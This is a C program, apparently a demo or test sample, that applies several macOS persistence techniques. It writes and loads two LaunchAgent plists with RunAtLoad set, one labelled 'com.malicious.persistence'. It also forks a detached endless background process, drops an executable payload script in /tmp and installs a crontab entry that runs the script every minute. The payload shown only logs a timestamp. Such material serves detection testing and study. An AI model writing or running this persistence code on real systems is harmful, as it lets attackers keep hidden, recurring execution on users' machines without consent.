#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define BTM_LAUNCH_AGENT_PLIST_PATH                                            \
  "/Users/Shared/com.demo.backgroundtask.plist"
#define BTM_LAUNCH_AGENT_LABEL "com.malicious.persistence.backgroundtask"
#define PAYLOAD_PATH "/tmp/payload.sh"
#define LAUNCH_AGENT_PLIST_PATH "/Users/Shared/com.malicious.persistence.plist"
#define LAUNCH_AGENT_LABEL "com.demo.persistence"
#define LOGIN_SCRIPT_PATH "/Users/Shared/login_persistence.sh"

void create_btm_launch_agent() {
  FILE *fp = fopen(BTM_LAUNCH_AGENT_PLIST_PATH, "w");
  if (fp) {
    fprintf(fp,
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
            "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
            "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
            "<plist version=\"1.0\">\n"
            "<dict>\n"
            "    <key>Label</key>\n"
            "    <string>%s</string>\n"
            "    <key>ProgramArguments</key>\n"
            "    <array>\n"
            "        <string>%s</string>\n"
            "    </array>\n"
            "    <key>RunAtLoad</key>\n"
            "    <true/>\n"
            "    <key>Background</key>\n"
            "    <true/>\n"
            "</dict>\n"
            "</plist>\n",
            BTM_LAUNCH_AGENT_LABEL, PAYLOAD_PATH);
    fclose(fp);
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "launchctl load %s",
             BTM_LAUNCH_AGENT_PLIST_PATH);
    system(cmd);
  }
}

void start_background_task() {
  pid_t pid = fork();
  if (pid < 0) {
    perror("fork");
    return;
  }
  if (pid > 0) {
    return;
  }

  setsid();

  while (1) {
    FILE *fp = fopen("/tmp/background_task.log", "a");
    if (fp) {
      time_t now = time(NULL);
      fprintf(fp, "Background task running at %s", ctime(&now));
      fclose(fp);
    }
    sleep(60);
  }
}

void create_payload() {
  FILE *fp = fopen(PAYLOAD_PATH, "w");
  if (fp) {
    fprintf(fp, "#!/bin/bash\n");
    fprintf(fp, "echo 'Payload executed at $(date)' >> /tmp/payload.log\n");
    fclose(fp);
    chmod(PAYLOAD_PATH, 0755);
  }
}

void add_crontab_entry() {
  FILE *fp = fopen("/tmp/cronjob.txt", "w");
  if (fp) {
    fprintf(fp, "* * * * * %s\n", PAYLOAD_PATH);
    fclose(fp);
    system("crontab /tmp/cronjob.txt");
    unlink("/tmp/cronjob.txt");
  }
}

void create_launch_agent() {
  FILE *fp = fopen(LAUNCH_AGENT_PLIST_PATH, "w");
  if (fp) {
    fprintf(fp,
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
            "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
            "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
            "<plist version=\"1.0\">\n"
            "<dict>\n"
            "    <key>Label</key>\n"
            "    <string>%s</string>\n"
            "    <key>ProgramArguments</key>\n"
            "    <array>\n"
            "        <string>%s</string>\n"
            "    </array>\n"
            "    <key>RunAtLoad</key>\n"
            "    <true/>\n"
            "</dict>\n"
            "</plist>\n",
            LAUNCH_AGENT_LABEL, PAYLOAD_PATH);
    fclose(fp);
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "launchctl load %s", LAUNCH_AGENT_PLIST_PATH);
    system(cmd);
  }
}

int main() {
  printf("Creating BTM-style LaunchAgent plist (background task)...\n");
  create_btm_launch_agent();
  printf("Starting background persistence task...\n");
  start_background_task();
  printf("Creating demo persistence payload...\n");
  create_payload();

  printf("Adding crontab entry...\n");
  add_crontab_entry();

  printf("Creating LaunchAgent plist...\n");
  create_launch_agent();

  printf("Persistence techniques applied. Check /tmp/payload.log for execution "
         "logs.\n");
  return 0;
}